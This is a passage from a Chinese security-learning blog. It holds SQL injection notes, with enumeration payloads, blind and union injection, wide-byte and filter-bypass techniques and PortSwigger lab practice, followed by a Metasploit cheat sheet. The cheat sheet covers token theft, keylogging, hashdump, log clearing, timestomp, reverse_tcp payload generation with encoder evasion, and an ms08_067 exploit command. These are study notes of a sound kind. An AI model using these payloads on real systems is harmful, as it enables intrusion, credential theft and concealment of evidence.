<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">null</span>,<span class="keyword">null</span>,...,group_concat(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database()</span><br><span class="line"><span class="comment">--或者</span></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">null</span>,<span class="keyword">null</span>,...,table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database() limit <span class="number">0</span>,<span class="number">1</span></span><br></pre></td></tr></table></figure></li>
<li><p>获取数据库列名</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">null</span>,<span class="keyword">null</span>,...,group_concat(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema<span class="operator">=</span>database() <span class="keyword">and</span> table_name<span class="operator">=</span><span class="string">&#x27;users&#x27;</span></span><br></pre></td></tr></table></figure></li>
<li><p>获取用户信息</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">null</span>,group_concat(username,password) <span class="keyword">from</span> users</span><br></pre></td></tr></table></figure></li>
<li><p>破解数据</p>
</li>
<li><p>提升权限</p>
</li>
<li><p>内网渗透</p>
</li>
</ol>
<h2 id="5-注入分类"><a href="#5-注入分类" class="headerlink" title="5. 注入分类"></a>5. 注入分类</h2><h3 id="按变量类型分"><a href="#按变量类型分" class="headerlink" title="按变量类型分"></a>按变量类型分</h3><ul>
<li>数字型注入:注入的参数为整数</li>
<li>字符型注入：注入的参数为字符/串</li>
<li>搜索注入：在搜索栏中利用恶意代码进行注入</li>
</ul>
<h3 id="按HTTP提交方式分"><a href="#按HTTP提交方式分" class="headerlink" title="按HTTP提交方式分"></a>按HTTP提交方式分</h3><ul>
<li><p>GET注入</p>
</li>
<li><p>POST注入：注入字段在POST数据中</p>
</li>
<li><p>Cookie注入：注入字段在Cookie数据中</p>
</li>
<li><p>XFF注入：XFF(X-Forward-For)，简称XFF头，它代表客户端真实的ip地址</p>
</li>
</ul>
<h3 id="按注入方式分"><a href="#按注入方式分" class="headerlink" title="按注入方式分"></a>按注入方式分</h3><ul>
<li><p>报错注入</p>
</li>
<li><p>盲注</p>
<ul>
<li><p>布尔盲注</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; substr(database(),1,1)=&#x27;</span>t<span class="string">&#x27;--+     /*判断数据名长度*/</span></span><br></pre></td></tr></table></figure></li>
<li><p>时间盲注</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id <span class="operator">=</span> <span class="number">1</span> <span class="keyword">and</span> if(length(database())<span class="operator">&gt;</span><span class="number">1</span>,sleep(<span class="number">5</span>),<span class="number">1</span>)</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>union注入 </p>
<p>列数相同且类型才能正常展示</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id <span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span> <span class="comment">/*获取字段*/</span></span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="编码问题"><a href="#编码问题" class="headerlink" title="编码问题"></a>编码问题</h3><ul>
<li><p>宽字节注入</p>
<ol>
<li>宽字节是相对于ascII这样单字节而言；GB2312、GBK、GB18030、BIG5、Shift_JIS等都是宽字节，实际占两字节</li>
<li>一个gbk编码汉字，占2个字节。一个utf-8编码汉字，占3个字节</li>
<li>数据库编码与PHP编码设置为不同的两个编码那么就有可能产生宽字节注入</li>
</ol>
<p><strong>转义函数：</strong></p>
<p>为过滤用户输入，对特殊的字符加反斜杠“\”进行转义；</p>
<p>Mysql转义函数：addslashes，mysql_real_escape_string，mysql_escape_string等</p>
<p><strong>利用条件：</strong></p>
<ul>
<li>查询参数是被单引号包围的，传入的单引号又被转义符()转义，如在后台数据库中对接受的参数使用addslashes()过滤</li>
</ul>
<ul>
<li>数据库的编码为GBK</li>
<li>前一个ASCII码要大于128，才可以到达汉字的编码范围</li>
</ul>
<p><strong>利用方式:</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id <span class="operator">=</span> <span class="number">-1</span><span class="operator">%</span>DF<span class="string">&#x27; union select 1,user(),3,%23</span></span><br></pre></td></tr></table></figure>

<p>在上述条件下，单引号’被转义为%5c，所以就构成了**%df**%5c，而在GBK编码方式下，%df%5c是一个繁体字“連”，所以单引号成功逃逸。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">%df%27&#x3D;&#x3D;&#x3D;&gt;(addslashes)&#x3D;&#x3D;&#x3D;&#x3D;&gt;%df%5c%27&#x3D;&#x3D;&#x3D;&#x3D;&gt;(GBK)&#x3D;&#x3D;&#x3D;&#x3D;&gt;運’</span><br><span class="line">用户输入&#x3D;&#x3D;&gt;过滤函数&#x3D;&#x3D;&gt;代码层的$sql&#x3D;&#x3D;&gt;mysql处理请求&#x3D;&#x3D;&gt;mysql中的sql</span><br></pre></td></tr></table></figure>

<p><strong>防御：</strong></p>
<p>使用mysql_set_charset指定字符集且使用mysql_real_escape_string进行转义</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SET</span> character_set_connection<span class="operator">=</span>gbk, character_set_results<span class="operator">=</span>gbk,character_set_client<span class="operator">=</span><span class="type">binary</span></span><br></pre></td></tr></table></figure>

<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql_real_escape_string与addslashes的不同之处在于其会考虑当前设置的字符集（使用mysql_set_charset指定字符集），不会出现前面的df和<span class="number">5</span>c拼接为一个宽字节的问题</span><br></pre></td></tr></table></figure></li>
<li><p>base64注入：注入字符串经过base64加密</p>
<p>对参数进行base64编码，再发送请求。</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*id=1&#x27;，1的base64编码为MSc=，而=的url编码为%3d*/</span></span><br><span class="line">id<span class="operator">=</span>MSc<span class="operator">%</span><span class="number">3</span>d </span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="3-注入绕过"><a href="#3-注入绕过" class="headerlink" title="3.注入绕过"></a>3.注入绕过</h2><ul>
<li><p><strong>大小写绕过</strong>：大小写不敏感</p>
</li>
<li><p><strong>双写绕过</strong>：将关键字select等只使用replace()函数置换为空，select变成seleselectct</p>
</li>
<li><p><strong>编码绕过</strong>（url全编码、十六进制）：</p>
<ul>
<li>十六进制绕过</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from users where username &#x3D; 0x7465737431;</span><br><span class="line">+----+----------+----------+</span><br><span class="line">| id | username | password |</span><br><span class="line">+----+----------+----------+</span><br><span class="line">|  1 | test1    | pass     |</span><br><span class="line">+----+----------+----------+</span><br></pre></td></tr></table></figure>

<ul>
<li><p>ascii 编码绕过</p>
<p>Test 等价于 CHAR(101)+CHAR(97)+CHAR(115)+CHAR(116)</p>
</li>
</ul>
</li>
<li><p><strong>内联注释绕过</strong> /* */</p>
</li>
<li><p><strong>关键字替换</strong></p>
<ul>
<li><p><strong>逗号绕过</strong></p>
<p>substr、mid()函数中可以利用from to来摆脱对逗号的利用；</p>
<p>limit中可以利用offset来摆脱对逗号的利用</p>
</li>
<li><p><strong>比较符号( &gt;、&lt; )绕过</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> <span class="operator">!</span>(id <span class="operator">&lt;&gt;</span> <span class="number">1</span>);</span><br><span class="line"><span class="comment">--等价于</span></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id <span class="operator">=</span> <span class="number">1</span>;</span><br></pre></td></tr></table></figure></li>
<li><p><strong>逻辑符号的替换</strong>（and=&amp;&amp; or=|| xor=| not=!）</p>
</li>
<li><p><strong>空格绕过</strong>（用()，+等绕过）</p>
</li>
</ul>
</li>
<li><p><strong>等价函数绕过</strong></p>
<ul>
<li>hex()、bin()=ascii()</li>
<li>concat_ws()=group_concat()</li>
<li>mid()、substr()=substring()</li>
<li>sleep() –&gt;benchmark()</li>
</ul>
</li>
<li><p><strong>缓冲区溢出绕过</strong> (id=1 and (select 1)=(Select 0xAAAAAAAAAAAAAAAAAAAAA)+UnIoN+SeLeCT+1,2,version(),4,5,database(),user(),8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26 ,27,28,29,30,31,32,33,34,35,36–+ 其中0xAAAAAAAAAAAAAAAAAAAAA这里A越多越好。。一般会存在临界值，其实这种方法还对后缀名的绕过也有用)</p>
</li>
</ul>
<p>到这儿大概可以拿下数据库的基本用户权限，若需提权需参考mysql MOF和UDF提权。</p>
<h2 id="4-练习："><a href="#4-练习：" class="headerlink" title="4. 练习："></a>4. 练习：</h2><p>以下为自己练习内容(可忽略)</p>
<h3 id="1-Retrieving-hidden-data"><a href="#1-Retrieving-hidden-data" class="headerlink" title="1.Retrieving hidden data"></a>1.Retrieving hidden data</h3><p><a target="_blank" rel="noopener" href="https://ac991fcc1e603304800c031d001b00e5.web-security-academy.net/filter?category=Gifts">where子句的SQLi允许查询隐藏数据</a></p>
<ul>
<li>测试是否存在注入：’   ‘’，内部服务器错误，存在sql注入。</li>
</ul>
<p><img src="/2021/04/13/2021-04-13/2.jpg"></p>
<ul>
<li>数据库正常查询语句：</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM products WHERE category &#x3D; &#39;pets&#39; AND release &#x3D; 1</span><br></pre></td></tr></table></figure>

<ul>
<li>加单/双引号测试注入:内部服务器报错</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM products WHERE category &#x3D; &#39;&#39;&#39; AND release &#x3D; 1</span><br></pre></td></tr></table></figure>

<ul>
<li>加双连接符注释掉后面内容：无category为空的内容</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM products WHERE category &#x3D; &#39;&#39;--&#39; AND release &#x3D; 1</span><br></pre></td></tr></table></figure>

<ul>
<li>加入真命题，返回全部内容，包含发布与未发布的。release=1代表已发布的。</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM products WHERE category &#x3D; &#39;&#39; or 1&#x3D;1 --&#39; AND release &#x3D; 1</span><br></pre></td></tr></table></figure>

<h3 id="2-Subverting-application-logic"><a href="#2-Subverting-application-logic" class="headerlink" title="2.Subverting application logic"></a>2.Subverting application logic</h3><p><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/sql-injection/lab-login-bypass">登陆绕过</a></p>
<p><img src="/2021/04/13/2021-04-13/5.jpg"></p>
<p>与上面相同，这里不再过多赘述</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">正常查询语句：</span><br><span class="line">SELECT firstname FROM users WHERE  username &#x3D; &#39;administrator&#39; AND password &#x3D; &#39;admin&#39;</span><br><span class="line">测试：</span><br><span class="line">SELECT firstname FROM users WHERE  username &#x3D; &#39;&#39;&#39; AND password &#x3D; &#39;admin&#39;</span><br><span class="line">注释后成功注入：</span><br><span class="line">SELECT firstname FROM users WHERE  username &#x3D; &#39;administrator&#39;-- AND password &#x3D; &#39;admin&#39;</span><br></pre></td></tr></table></figure>



<h3 id="3-UNION-attacks-where-you-can-retrieve-data-from-different-database-tables"><a href="#3-UNION-attacks-where-you-can-retrieve-data-from-different-database-tables" class="headerlink" title="3.UNION attacks, where you can retrieve data from different database tables."></a>3.UNION attacks, where you can retrieve data from different database tables.</h3><p>从数据库表中检索数据：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">正常查询：</span><br><span class="line">SELECT name,description FROM products WHERE category &#x3D; &#39;GIFTS&#39;</span><br><span class="line">查询其他数据：</span><br><span class="line">SELECT name,description FROM products WHERE category &#x3D; &#39;&#39;UNION SELECT username, password FROM users--</span><br></pre></td></tr></table></figure>

<p>union对原始查询结果追加多个额外的<code>SELECT</code>查询。必须满足：</p>
<ul>
<li>各个查询列数量相同。</li>
<li>每个列中的数据类型相同。</li>
</ul>
<p>要进行union注入的前提是，知道原始查询返回的列数、原始查询中返回的哪些列的数据类型比较适合保存注入的结果。</p>
<p>首先需要确定列数：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&#39; ORDER BY 1--</span><br><span class="line">&#39; ORDER BY 2--</span><br><span class="line">&#39; ORDER BY 3--</span><br><span class="line">etc.</span><br><span class="line">&#x2F;&#x2F;NULL可以转换为每种常用的数据类型</span><br><span class="line">&#39; UNION SELECT NULL--</span><br><span class="line">&#39; UNION SELECT NULL,NULL--</span><br><span class="line">&#39; UNION SELECT NULL,NULL,NULL--</span><br><span class="line">etc.</span><br></pre></td></tr></table></figure>

<h1 id="0x03-参考："><a href="#0x03-参考：" class="headerlink" title="0x03 参考："></a>0x03 参考：</h1><p><a target="_blank" rel="noopener" href="https://www.loongten.com/2019/12/28/pentest-learn-sql-bypass/">https://www.loongten.com/2019/12/28/pentest-learn-sql-bypass/</a></p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2869">https://xz.aliyun.com/t/2869</a></p>
<p><a target="_blank" rel="noopener" href="https://tingqiao.github.io/posts/5a68b32e/">https://tingqiao.github.io/posts/5a68b32e/</a></p>
<p><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/5de47d05e333">https://www.jianshu.com/p/5de47d05e333</a></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://swanq.top/2021/04/01/msf/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/author.jpg">
      <meta itemprop="name" content="swanQ">
      <meta itemprop="description" content="Try & Enjoy">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="SwanQ's Blue SKY">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/04/01/msf/" class="post-title-link" itemprop="url">后渗透-metasploit(MSF) meterpreter</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2021-04-01 21:50:29" itemprop="dateCreated datePublished" datetime="2021-04-01T21:50:29+08:00">2021-04-01</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2021-06-18 21:48:02" itemprop="dateModified" datetime="2021-06-18T21:48:02+08:00">2021-06-18</time>
              </span>

          
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>5.1k</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>5 分钟</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>msf深入起来包罗万象，那我们先慢慢来认识它吧。跟着某师傅的教程熟悉一遍，并记录自己所认为最重要的东西。</p>
<h1 id="0x01-MSF基础认知"><a href="#0x01-MSF基础认知" class="headerlink" title="0x01 MSF基础认知"></a>0x01 MSF基础认知</h1><h2 id="1-体系框架"><a href="#1-体系框架" class="headerlink" title="1.体系框架"></a>1.体系框架</h2><p><img src="/2021/04/01/msf/2.png"></p>
<h2 id="2-文件系统"><a href="#2-文件系统" class="headerlink" title="2.文件系统"></a>2.文件系统</h2><p>首先要知道msf的目录位于 <strong>/usr/share/metasploit-framework</strong></p>
<p>先熟悉一下msf的重要文件系统：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">data：			Metasploit使用的可编辑文件,常用是其wordlists中的字典文件</span><br><span class="line">modules：		实际的MSF模块</span><br><span class="line">plugins：		可以在运行时加载的插件</span><br><span class="line">scripts：		Meterpreter和其他脚本</span><br><span class="line">tools：			各种有用的命令行工具</span><br><span class="line">documentation：	为框架提供文档</span><br><span class="line">external：		源代码和第三方库</span><br><span class="line">lib：			框架代码库的&#39;肉&#39;</span><br><span class="line"></span><br><span class="line">modules包括:</span><br><span class="line">    auxiliary	#漏洞辅助模块一般是没有攻击载荷的漏洞攻击</span><br><span class="line">    encoders 	#编码器模块</span><br><span class="line">    evasion	  	#简单的反杀模块</span><br><span class="line">    exploits	#渗透攻击模块</span><br><span class="line">    nops		#空指令模块</span><br><span class="line">    payloads	#漏洞负载模块</span><br></pre></td></tr></table></figure>

<h1 id="0x02-初始化"><a href="#0x02-初始化" class="headerlink" title="0x02 初始化"></a>0x02 初始化</h1><p>Metasploit使用<strong>PostgreSQL</strong>作为数据库，所以先启动postgresql.<br>并初始化数据库<br>然后以root用户打开MSF<br><img src="/2021/04/01/msf/1.jpg"></p>
<h1 id="0x03-后渗透必备命令"><a href="#0x03-后渗透必备命令" class="headerlink" title="0x03 后渗透必备命令"></a>0x03 后渗透必备命令</h1><h2 id="1）基本系统命令"><a href="#1）基本系统命令" class="headerlink" title="1）基本系统命令"></a>1）基本系统命令</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">sessions -l  #列出会话id值   </span><br><span class="line">sessions -i &lt;ID值&gt;	#进入会话   </span><br><span class="line">sessions -k  #杀死会话</span><br><span class="line"></span><br><span class="line">reboot       #重启&#x2F;</span><br><span class="line">shutdown     #重启&#x2F;关机</span><br><span class="line"></span><br><span class="line">ps 			 #查看当前活跃进程    </span><br><span class="line">kill &lt;PID值&gt;  #杀死进程</span><br><span class="line"></span><br><span class="line">background 	#将当前会话放置后台</span><br><span class="line">run  		#执行已有的模块，输入run后按两下tab，列出已有的脚本</span><br><span class="line">info 		#查看已有模块信息</span><br><span class="line">getuid 		#查看权限 </span><br><span class="line">getpid 		#获取当前进程的pid</span><br><span class="line">sysinfo 	#查看目标机系统信息</span><br><span class="line">idletime 	#查看目标机闲置时间</span><br><span class="line">shell 		#进入目标机cmd shell</span><br></pre></td></tr></table></figure>



<h1 id="0x04-常用命令"><a href="#0x04-常用命令" class="headerlink" title="0x04 常用命令"></a>0x04 常用命令</h1><h2 id="metasploit命令"><a href="#metasploit命令" class="headerlink" title="metasploit命令"></a>metasploit命令</h2><ul>
<li>help<br>打开meterpreter使用帮助。</li>
<li>run scriptname<br>运行meterpreter脚本，在scripts/meterpreter目录下可查看到所有脚本名。</li>
<li>sysinfo<br>列出受控主机的系统信息。</li>
<li>ls<br>列出目标主机的文件和文件夹信息。</li>
<li>use priv<br>加载特权提升扩展模块，来扩展metasploit库。</li>
<li>ps<br>显示所有运行的进程以及相关联的用户账户。</li>
<li>migrate PID<br>迁移到一个指定的进程ID（PID号可通过ps命令从主机上获得）。</li>
<li>use incognito<br>加载incognito功能（用来盗窃目标主机的令牌或假冒用户）</li>
<li>list_tokens -u<br>列出目标主机用户的可用令牌。</li>
<li>list_tokens -g<br>列出目标主机用户组的可用令牌。</li>
<li>impersonate_token DOMAIN_NAME\USERNAME.<br>假冒目标主机上的可用令牌。</li>
<li>steal_token PID<br>盗窃给定进程的可用令牌并进行令牌假冒。</li>
<li>drop_token<br>停止假冒当前令牌。</li>
<li>getsystem<br>通过各种攻击向量来提升系统用户权限。</li>
<li>execute -f cmd.exe -i<br>执行cmd.exe命令并进行交互。</li>
<li>execute -f cmd.exe -i -t<br>以所有可用令牌来执行cmd命令并隐藏该进程。</li>
<li>rev2self<br>回到控制目标主机的初始用户账户下。</li>
<li>reg command<br>在目标主机注册表中进行交互，创建，删除，查询等操作。</li>
<li>setdesktop number<br>切换到另一个用户界面（该功能基于那些用户已登录）。</li>
<li>screenshot<br>对目标主机的屏幕进行截图。</li>
<li>upload file<br>向目标主机上传文件。</li>
<li>download file<br>从目标主机下载文件。</li>
<li>keyscan_start<br>针对远程目标主机开启键盘记录功能。</li>
<li>keyscan_dump<br>存储目标主机上捕获的键盘记录。</li>
<li>keyscan_stop<br>停止针对目标主机的键盘记录。</li>
<li>getprivs<br>尽可能多的获取目标主机上的特权。</li>
<li>uictl enable keyboard/mouse<br>接管目标主机的键盘和鼠标。</li>
<li>background<br>将你当前的metasploit shell转为后台执行。</li>
<li>hashdump<br>导出目标主机中的口令哈希值。</li>
<li>use sniffer<br>加载嗅探模式。</li>
<li>sniffer_interfaces<br>列出目标主机所有开放的网络端口。</li>
<li>sniffer_dump interfaceID pcapname<br>在目标主机上启动嗅探。</li>
<li>sniffer_start interfaceID packet-buffer<br>在目标主机上针对特定范围的数据包缓冲区启动嗅探。</li>
<li>sniffer_stats interfaceID<br>获取正在实施嗅探网络接口的统计数据。</li>
<li>sniffer_stop interfaceID<br>停止嗅探。</li>
<li>add_user username password -h ip<br>在远程目标主机上添加一个用户。</li>
<li>clearev<br>清楚目标主机上的日志记录。</li>
<li>timestomp<br>修改文件属性，例如修改文件的创建时间（反取证调查）。</li>
<li>reboot<br>重启目标主机。</li>
</ul>
<h2 id="msfpayload命令"><a href="#msfpayload命令" class="headerlink" title="msfpayload命令"></a>msfpayload命令</h2><ul>
<li>msfpayload -h<br>msfpayload的帮助信息。</li>
<li>msfpayload windows/meterpreter/bind_tcp O<br>列出所有windows/meterpreter/bind_tcp下可用的攻击载荷的配置项（任何攻击载荷都是可用配置的）。</li>
<li>msfpayload windows/meterpreter/reverse_tcp LHOST=IP LPORT=PORT X &gt; payload.exe<br>创建一个metasploit的reverse_tcp攻击载荷，回连到LHOSTip的LPORT，将其保存为名为payload.exe的windows下可执行程序。</li>
<li>msfpayload windows/meterpreter/reverse_tcp LHOST=IP LPORT=PORT R &gt; payload.raw<br>创建一个metasploit的reverse_tcp攻击载荷，回连到LHOSTip的LPORT，将其保存为名为payload.raw，该文件后面的msffencode中使用。</li>
<li>msfpayload windows/meterpreter/reverse_tcp LPORT=PORT C &gt; payload.c<br>创建一个metasploit的reverse_tcp攻击载荷，导出C格式的shellcode。</li>
<li>msfpayload windows/meterpreter/reverse_tcp LPORT=PORT J &gt; payload.java<br>创建一个metasploit的reverse_tcp攻击载荷，导出成以%u编码方式的javaScript语言字符串。</li>
</ul>
<h2 id="msfencode命令"><a href="#msfencode命令" class="headerlink" title="msfencode命令"></a>msfencode命令</h2><ul>
<li>mefencode -h<br>列出msfencode的帮助命令。</li>
<li>msfencode -l<br>列出所有可用的编码器。</li>
<li>msfencode -t (c,elf,exe,java,is_le,js_be,perl,raw,ruby,vba,vbs,loop_vbs,asp,war,macho)<br>显示编码缓冲区的格式。</li>
<li>msfencode -i payload.raw -o encoded_payload.exe -e x86/shikata_ga_nai -c 5 -t exe<br>使用shikata_ga_nai编码器对payload.raw文件进行5编码，然后导出一个名为encoded_payload.exe的文件。</li>
<li>msfpayload windows/meterpreter/bind_tcp LPORT=PORT R | msfencode -e x86/_countdown -c 5 -t raw | msfencode -e x86/shikata_ga_nai -c 5 -t exe -o multi-encoded_payload.exe<br>创建一个经过多种编码格式嵌套编码的攻击载荷。</li>
<li>msfencode -i payload.raw BufferRegister=ESI -e x86/al破解a_mixed -t c<br>创建一个纯字母数字的shellcode，由ESI寄存器只想shellcode，以C格式输出。</li>
</ul>
<h2 id="MSFcli命令"><a href="#MSFcli命令" class="headerlink" title="MSFcli命令"></a>MSFcli命令</h2><ul>
<li>msfcli | grep exploit<br>仅列出渗透攻击模块。</li>
<li>msfcli | grep exploit/windows,<br>仅列出与windows相关的渗透攻击模块。</li>
<li>msfcli exploit/windows/smb/ms08_067_netapi PAYLOAD=windows/meterpreter/bind_tcp LPORT=PORT RHOST=IP E<br>对IP发起ms08_067_netapi渗透攻击，配置了bind_tcp攻击载荷，并绑定在PORT端口进行监听。</li>
</ul>
<h2 id="其他命令"><a href="#其他命令" class="headerlink" title="其他命令"></a>其他命令</h2><ul>
<li>show exploits<br>列出metasploit框架中的所有渗透攻击模块。</li>
<li>show payloads<br>列出metasploit框架中的所有攻击载荷。</li>
<li>show auxiliary<br>列出metasploit框架中的所有辅助攻击载荷。</li>
<li>search name<br>查找metasploit框架中所有的渗透攻击和其他模块。</li>
<li>info<br>展示出制定渗透攻击或模块的相关信息。</li>
<li>use name<br>装载一个渗透攻击或模块。</li>
<li>LHOST<br>本地可以让目标主机连接的IP地址，通常当目标主机不在同一个局域网内时，就需要是一个公共IP地址，特别为反弹式shell使用。</li>
<li>RHOST<br>远程主机或是目标主机。</li>
<li>set function<br>设置特定的配置参数（EG：设置本地或远程主机参数）。</li>
<li>setg function<br>以全局方式设置特定的配置参数（EG：设置本地或远程主机参数）。</li>
<li>show options<br>列出某个渗透攻击或模块中所有的配置参数。</li>
<li>show targets<br>列出渗透攻击所有支持的目标平台。</li>
<li>set target num<br>指定你所知道的目标的操作系统以及补丁版本类型。</li>
<li>set payload name<br>指定想要使用的攻击载荷。</li>
<li>show advanced<br>列出所有高级配置选项。</li>
<li>set autorunscript migrate -f.<br>在渗透攻击完成后，将自动迁移到另一个进程。</li>
<li>check<br>检测目标是否选定渗透攻击存在相应的安全漏洞。</li>
<li>exploit<br>执行渗透攻击或模块来攻击目标。</li>
<li>exploit -j<br>在计划任务下进行渗透攻击（攻击将在后台进行）。</li>
<li>exploit -z<br>渗透攻击完成后不与回话进行交互。</li>
<li>exploit -e encoder<br>制定使用的攻击载荷编码方式（EG：exploit -e shikata_ga_nai）。</li>
<li>exploit -h<br>列出exploit命令的帮助信息。</li>
<li>sessions -l<br>列出可用的交互会话（在处理多个shell时使用）。</li>
<li>sessions -l -v<br>列出所有可用的交互会话以及详细信息，EG：攻击系统时使用了哪个安全漏洞。</li>
<li>sessions -s script<br>在所有活跃的metasploit会话中运行一个特定的metasploit脚本。</li>
<li>sessions -K<br>杀死所有活跃的交互会话。</li>
<li>sessions -c cmd<br>在所有活跃的metasploit会话上执行一个命令。</li>
<li>sessions -u sessionID<br>升级一个普通的win32 shell到metasploit shell。</li>
<li>db_create name<br>创建一个数据库驱动攻击所要使用的数据库（EG：db_create autopwn）。</li>
<li>db_connect name<br>创建并连接一个数据库驱动攻击所要使用的数据库（EG：db_connect user:passwd@ip/sqlname）。</li>
<li>db_namp<br>利用nmap并把扫描数据存储到数据库中（支持普通的nmap语句，EG：-sT -v -P0）。</li>
<li>db_autopwn -h<br>展示出db_autopwn命令的帮助信息。</li>
<li>db_autopwn -p -r -e<br>对所有发现的开放端口执行db_autopwn，攻击所有系统，并使用一个反弹式shell。<br>db_destroy<br>删除当前数据库。</li>
<li>db_destroy user：passwd@host：port/database<br>使用高级选项来删除数据库。</li>
</ul>
<h1 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h1><ol>
<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_34801745/article/details/110790957">https://blog.csdn.net/qq_34801745/article/details/110790957</a></li>
